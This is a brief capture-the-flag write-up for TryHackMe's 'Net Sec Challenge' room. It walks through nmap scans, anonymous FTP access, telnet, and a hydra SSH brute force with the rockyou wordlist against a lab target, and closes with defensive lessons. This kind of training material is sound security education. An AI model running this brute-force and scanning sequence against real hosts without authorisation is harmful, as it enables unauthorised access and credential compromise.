# 🌐 Net Sec Challenge

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Net Sec Challenge](https://tryhackme.com/room/netsecchallenge) |
| **Difficulty** | 🟢 Easy |
| **Category** | Networking |
| **OS** | Linux |
| **Tools** | nmap, telnet, hydra, ftp |

---

## 🎯 Objective

Apply network security concepts in a practical challenge — use Nmap, Telnet, Hydra, and FTP to find flags.

---

## 🔍 Reconnaissance

```bash
# Full port scan with versions
nmap -sC -sV -p- --min-rate 5000 TARGET_IP
```

**Key open ports identified** — various services across standard and non-standard ports.

---

## 💥 Exploitation

**Flag 1 — Nmap version detection:**
```bash
nmap -sV TARGET_IP
# Read flag from service banner
```

**Flag 2 — FTP anonymous login:**
```bash
ftp TARGET_IP
# Username: anonymous
# Password: (blank)
ls
get flag.txt
```

**Flag 3 — Telnet:**
```bash
telnet TARGET_IP 23
# Connect and read flag from banner or login
```

**Flag 4 — Hydra SSH brute force:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh
# Use found credentials to SSH in and read flag
```

**Flag 5 — Nmap NSE scripts:**
```bash
nmap --script=ftp-anon,ftp-syst TARGET_IP
```

---

## 📚 Lessons Learned

- Service banners often contain sensitive version information — hide them in production
- Anonymous FTP access is a critical misconfiguration that should never exist in production
- Telnet transmits data in plaintext — replaced by SSH everywhere in modern environments
- Combining Nmap, Hydra, and manual testing covers most network attack surfaces

---
*by OwlRC 🦉 | github.com/OwlRC*
